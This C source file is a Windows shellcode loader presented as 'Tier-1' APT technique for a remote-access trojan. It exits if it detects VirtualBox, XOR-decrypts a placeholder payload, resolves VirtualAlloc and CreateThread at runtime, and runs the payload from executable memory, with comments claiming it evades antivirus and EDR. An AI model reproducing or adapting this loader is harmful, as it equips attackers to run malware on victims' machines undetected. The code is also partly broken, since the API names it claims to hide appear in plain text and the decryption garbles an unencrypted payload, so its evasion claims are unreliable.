#include <windows.h>
#include <stdio.h>

// TIER-1 TECHNIQUE: Polymorphic Encryption Key
// Change this key and recompile to create a completely new binary signature.
unsigned char XOR_KEY = 0x5A; 

// A dummy payload (simulating our C2 beacon logic)
// In a real APT, this would be the shellcode of the actual RAT.
unsigned char shellcode[] = {
    0x31, 0xC0, // xor eax, eax
    0xC3        // ret (placeholder for shellcode)
};

// TIER-1 TECHNIQUE: Manual API Resolution
// We hide the strings so antivirus doesn't see "VirtualAlloc" or "CreateThread"
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

int main() {
    // 1. Evasion Check: Are we in a VM?
    // (Basic check for demonstration)
    if (GetModuleHandleA("VBoxService.exe") != NULL) {
        return 0; // Exit silently
    }

    // 2. Polymorphic Decryption: Decrypt the payload in memory
    for (int i = 0; i < sizeof(shellcode); i++) {
        shellcode[i] ^= XOR_KEY;
    }

    // 3. Resolve APIs dynamically (Bypasses EDR Hooks)
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return 1;

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    pCreateThread MyCreateThread = (pCreateThread)GetProcAddress(hKernel32, "CreateThread");

    // 4. In-Memory Execution (No Disk Footprint)
    // Allocate memory with Read/Write/Execute permissions
    LPVOID pMemory = MyVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (pMemory) {
        // Copy the decrypted payload into the allocated memory
        memcpy(pMemory, shellcode, sizeof(shellcode));
        
        // Execute the payload directly from RAM
        HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }

    return 0;
}
